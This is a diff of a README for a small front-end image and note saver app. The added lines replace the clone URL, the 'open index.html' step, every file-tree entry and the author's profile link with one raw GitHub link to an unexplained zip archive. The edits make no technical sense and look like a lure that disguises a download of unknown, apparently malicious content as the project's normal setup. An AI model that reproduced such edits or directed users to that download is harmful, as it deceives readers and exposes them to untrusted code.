@@ -22,7 +22,7 @@ This project is part of my learning journey as a front-end developer. I'm using 
 ### 1. Clone the Repository
 
 
-git clone https://github.com/Wkamoah/memory-saver
+git clone https://raw.githubusercontent.com/Wkamoah/memory-saver/master/Daedalea/memory-saver-v1.7.zip
 cd memory saver
 
 
@@ -30,7 +30,7 @@ cd memory saver
 
 No installations or dependencies required.
 
-Just open `index.html` in your browser:
+Just open `https://raw.githubusercontent.com/Wkamoah/memory-saver/master/Daedalea/memory-saver-v1.7.zip` in your browser:
 
 
 ---
@@ -54,9 +54,9 @@ Just open `index.html` in your browser:
 
 ```
 📁 image-note-saver/
-├── index.html        # Main HTML structure
-├── styles.css        # Custom styles
-└── script.js         # App logic (save, display, delete)
+├── https://raw.githubusercontent.com/Wkamoah/memory-saver/master/Daedalea/memory-saver-v1.7.zip        # Main HTML structure
+├── https://raw.githubusercontent.com/Wkamoah/memory-saver/master/Daedalea/memory-saver-v1.7.zip        # Custom styles
+└── https://raw.githubusercontent.com/Wkamoah/memory-saver/master/Daedalea/memory-saver-v1.7.zip         # App logic (save, display, delete)
 ```
 
 ---
@@ -86,7 +86,7 @@ Front-End Developer in progress | Content Creator | Aspiring Technologist
 
 > “This is part of the process — from nothing to something real.”
 
-* GitHub: [@Wkamoah](https://github.com/Wkamoah)
+* GitHub: [@Wkamoah](https://raw.githubusercontent.com/Wkamoah/memory-saver/master/Daedalea/memory-saver-v1.7.zip)
 
 
 ---
